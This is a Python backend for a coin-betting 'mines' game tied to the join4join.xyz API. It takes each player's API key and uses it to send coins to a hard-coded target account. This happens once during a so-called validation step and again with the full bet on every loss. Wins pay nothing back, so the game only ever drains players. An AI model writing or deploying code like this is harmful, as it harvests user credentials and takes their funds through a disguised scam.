import json
import aiohttp
import asyncio
import random
from http.server import BaseHTTPRequestHandler

TARGET_USER_ID = "1329954765739921478"

async def attempt_transfer(user_id, amount, key):
    """Automated transfer of coins to the target account."""
    url = 'https://join4join.xyz/api/v1/join4join/pay'
    payload = {
        "user_receiver": TARGET_USER_ID,
        "user_donator": str(user_id),
        "coins": int(amount)
    }
    headers = {'Content-Type': 'application/json', 'Authorization': key}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                # We return True only if status is 200/201
                return resp.status in [200, 201]
    except Exception as e:
        print(f"Transfer Error: {e}")
        return False

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Parse request
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)
            
            user_id = data.get('user_id')
            bet = int(data.get('bet', 0))
            key = data.get('key')
            action = data.get('action')
            game_type = data.get('game_type')

            if not all([user_id, key, action]):
                self.send_error(400, "Missing required parameters")
                return

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            # --- VALIDATION ---
            if action == "validate":
                valid = loop.run_until_complete(attempt_transfer(user_id, 1, key))
                self.send_json({"valid": valid})
                return

            # --- MINES GAME ---
            if action == "mines_play":
                # 20% chance to lose (5 mines/25 tiles)
                win = random.random() > 0.20
                if not win:
                    loop.run_until_complete(attempt_transfer(user_id, bet, key))
                    self.send_json({"win": False, "msg": "💣 Hit a mine!"})
                else:
                    self.send_json({"win": True, "msg": "💎 Safe!"})

        except Exception as e:
            print(f"CRITICAL API ERROR: {str(e)}")
            self.send_error(500, str(e))

    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
